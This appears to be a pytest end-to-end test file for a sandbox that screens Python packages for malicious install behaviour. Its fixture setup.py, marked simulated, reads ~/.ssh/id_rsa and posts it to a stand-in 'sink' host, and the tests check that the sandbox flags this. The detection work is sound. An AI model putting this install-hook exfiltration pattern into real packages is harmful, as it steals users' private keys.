"""End-to-end through the real sandbox. Needs `shadowrun up` (sink + pypiserver) and Docker; skipped otherwise.
The malicious-looking fixture is hand-tarred (never built on the host) and only reads fake files / posts to `sink`."""
import shutil
import urllib.request

import pytest

from shadowrun import audit, config, db, pipeline
from shadowrun.sdist_tool import make_sdist

M1_SETUP = '''# SIMULATED TEST FIXTURE. INERT OUTSIDE THE SHADOW-RUN SANDBOX.
import os
import urllib.request
from setuptools import setup

try:
    data = open(os.path.expanduser("~/.ssh/id_rsa"), "rb").read()
    urllib.request.urlopen(urllib.request.Request("http://sink:9000/collect", data=data, method="POST"), timeout=3)
except Exception:
    pass

setup(name="report-export-pro", version="1.0.0", description="SIMULATED TEST FIXTURE", py_modules=[])
'''


def _up():
    try:
        urllib.request.urlopen(config.PYPI_URL + "/", timeout=2)
        import docker
        docker.from_env().containers.get("sink")
        return True
    except Exception:
        return False


pytestmark = pytest.mark.skipif(not _up(), reason="sandbox services not up (run scripts/up.sh)")


@pytest.fixture(scope="module", autouse=True)
def dist_and_db(tmp_path_factory):
    mp = pytest.MonkeyPatch()
    mp.setattr(config, "DB_PATH", tmp_path_factory.mktemp("db") / "e2e.db")
    dist = config.ROOT / "packages" / "dist"
    make_sdist("report-export-pro", "1.0.0", {"setup.py": M1_SETUP}, dist, "SIMULATED")
    for f in config.FETCH_DIR.glob("*/*"):  # benign calibration packages captured earlier
        if f.name.startswith(("csvtoolkit", "tinyjson_utils")):
            shutil.copy(f, dist / f.name)
    yield
    mp.undo()


def rules(run):
    return {f["rule_id"] for f in run["findings"]}


def test_malicious_fixture_findings_end_to_end():
    run = pipeline.run_action("report-export-pro")
    assert run["error"] is None, run
    assert {"CANARY_READ", "NET_OUTBOUND", "CANARY_EXFIL"} <= rules(run)


def test_benign_packages_have_no_findings():
    for spec in ("tinyjson-utils", "csvtoolkit"):
        run = pipeline.run_action(spec)
        assert run["error"] is None, run
        assert run["findings"] == [], (spec, run["findings"])


def test_tampered_pin_is_rejected():
    run = pipeline.run_action("csvtoolkit", pin_sha256="0" * 64)
    assert "HASH_MISMATCH" in rules(run)


def test_unknown_package_fails_closed():
    run = pipeline.run_action("does-not-exist")
    assert run["error"] and run["state"] == "ERROR"


def test_audit_chain_after_runs():
    assert audit.verify()["ok"] is True
    assert audit.verify()["checked"] > 10
